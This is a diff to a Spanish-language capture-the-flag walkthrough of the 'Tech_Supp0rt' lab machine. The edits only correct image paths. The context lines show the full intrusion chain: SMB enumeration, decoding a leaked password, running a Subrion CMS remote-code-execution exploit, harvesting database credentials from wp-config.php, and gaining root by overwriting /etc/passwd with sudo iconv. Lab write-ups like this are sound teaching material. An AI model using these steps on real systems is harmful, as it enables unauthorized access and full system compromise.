@@ -33,7 +33,7 @@ Se ejecuta el siguiente comando:
 ```bash
 nmap -p- -sV -sC 10.129.170.255
 ```
-![nmap](Maquinas_de_Windows/Tech_Supp0rt/imagenes/nmap.png)
+![nmap](Maquinas_de_Linux/Tech_Supp0rt/imagenes/nmap.png)
 
 Explicación del comando:
 - -p- → Escanea los 65535 puertos
@@ -53,7 +53,7 @@ Se ejecuta el siguiente comando:
 ```bash
 smbclient -L //10.129.170.255 -N
 ```
-![SMBCLIENT](Maquinas_de_Windows/Tech_Supp0rt/imagenes/smbclient.png)
+![SMBCLIENT](Maquinas_de_Linux/Tech_Supp0rt/imagenes/smbclient.png)
 
 Explicación del comando:
 - -L → Lista los recursos compartidos disponibles en el servidor
@@ -66,7 +66,7 @@ Tras identificar el recurso compartido **websvr**, se procede a acceder a él si
 ```bash
 smbclient //10.129.170.255/websvr -N
 ```
-![websvr](Maquinas_de_Windows/Tech_Supp0rt/imagenes/websvr.png)
+![websvr](Maquinas_de_Linux/Tech_Supp0rt/imagenes/websvr.png)
 
 Una vez dentro, se listan los archivos disponibles:
 
@@ -88,7 +88,7 @@ Se procede a descargar el archivo para su análisis:
 ```bash
 get enter.txt
 ```
-![enter](/Maquina_de_Linux/Tech_Supp0rt/imagenes/descargarenter.png)
+![enter](Maquinas_de_Linux/Tech_Supp0rt/imagenes/descargarenter.png)
 
 ## 4. Análisis del archivo enter.txt
 
@@ -97,7 +97,7 @@ Tras descargar el archivo `enter.txt`,  salimos de smb con exit y se procede a v
 ```bash
 cat enter.txt
 ```
-![cat](/Maquina_de_Linux/Tech_Supp0rt/imagenes/catenter.png)
+![cat](Maquinas_de_Linux/Tech_Supp0rt/imagenes/catenter.png)
 
 Resultados obtenidos:
 
@@ -114,7 +114,7 @@ La contraseña hay que descodificarla, utilizaremos este comando para hacerlo
 ```bash
 echo "7sKvntXdPEJaxazce9PXi24zaFrLiKWCk" | base58 -d | base32 -d | base64 -d
 ```
-![base](/Maquina_de_Linux/Tech_Supp0rt/imagenes/base.png)
+![base](Maquinas_de_Linux/Tech_Supp0rt/imagenes/base.png)
 
 El resultado de ese comando es esta contraseña:
 
@@ -129,7 +129,7 @@ Se accede al panel de administración del CMS Subrion a través del navegador:
 ```bash
 http://10.129.170.255/subrion/panel
 ```
-![url](/Maquina_de_Linux/Tech_Supp0rt/imagenes/login.png)
+![url](Maquinas_de_Linux/Tech_Supp0rt/imagenes/login.png)
 
 Se introducen las credenciales obtenidas previamente:
 
@@ -146,7 +146,7 @@ Para ello, se utiliza la herramienta `searchsploit`:
 ```bash
 searchsploit subrion
 ```
-![search](/Maquina_de_Linux/Tech_Supp0rt/imagenes/search.png)
+![search](Maquinas_de_Linux/Tech_Supp0rt/imagenes/search.png)
 
 Tras buscar vulnerabilidades con `searchsploit`, se identifica el siguiente exploit relevante:
 
@@ -168,7 +168,7 @@ Se descarga el exploit a la máquina local:
 ```bash
 searchsploit -m php/webapps/49876.py
 ```
-![search](/Maquina_de_Linux/Tech_Supp0rt/imagenes/searchsploit.png)
+![search](Maquinas_de_Linux/Tech_Supp0rt/imagenes/searchsploit.png)
 
 ### 6.2 Ejecución del exploit
 
@@ -182,7 +182,7 @@ sudo python3 SubrionRCE.py -u http://10.129.138.145/subrion/panel/ -l admin -p S
 ```
  Poner la ip de tu máquina victima
 
-![python](/Maquina_de_Linux/Tech_Supp0rt/imagenes/python2.png)
+![python](Maquinas_de_Linux/Tech_Supp0rt/imagenes/python2.png)
 
  Explicación de los parámetros:
 - -u → URL del CMS vulnerable
@@ -216,7 +216,7 @@ Resultado:
 ```bash
 drwxr-xr-x  4 scamsite scamsite 4096 May 29  2021 scamsite
 ```
-![ls](/Maquina_de_Linux/Tech_Supp0rt/imagenes/ls.png)
+![ls](Maquinas_de_Linux/Tech_Supp0rt/imagenes/ls.png)
 
 Se identifica el usuario scamsite, que será el principal objetivo para la escalada de privilegios.
 
@@ -229,7 +229,7 @@ Los sistemas CMS suelen almacenar credenciales en archivos de configuración. En
  cat /var/www/html/wordpress/wp-config.php
  ```
 
-![ls](/Maquina_de_Linux/Tech_Supp0rt/imagenes/mysql.png)
+![ls](Maquinas_de_Linux/Tech_Supp0rt/imagenes/mysql.png)
 
 
  ## 8. Acceso por SSH
@@ -254,7 +254,7 @@ Password: ImAScammerLOL!123!
 
 El acceso fue exitoso, obteniendo una shell interactiva en el sistema.
 
-![ssh](/Maquina_de_Linux/Tech_Supp0rt/imagenes/ssh.png)
+![ssh](Maquinas_de_Linux/Tech_Supp0rt/imagenes/ssh.png)
 
 
 ## 9. Escalada de privilegios
@@ -290,7 +290,7 @@ Se sobrescribe el archivo:
 sudo iconv -f utf-8 -t utf-8 /tmp/passwd -o /etc/passwd
 ```
 
-![root](/Maquina_de_Linux/Tech_Supp0rt/imagenes/root.png)
+![root](Maquinas_de_Linux/Tech_Supp0rt/imagenes/root.png)
 
 ## 11. Obtención de root
 
@@ -309,6 +309,6 @@ Resultado:
 ```bash
 root@TechSupport:~#
 ```
- ![root](Maquinas_de_Windows/Tech_Supp0rt/imagenes/root2.png)
+ ![root](Maquinas_de_Linux/Tech_Supp0rt/imagenes/root2.png)
 
  Ya tenemos la máxima autorización del sistema.
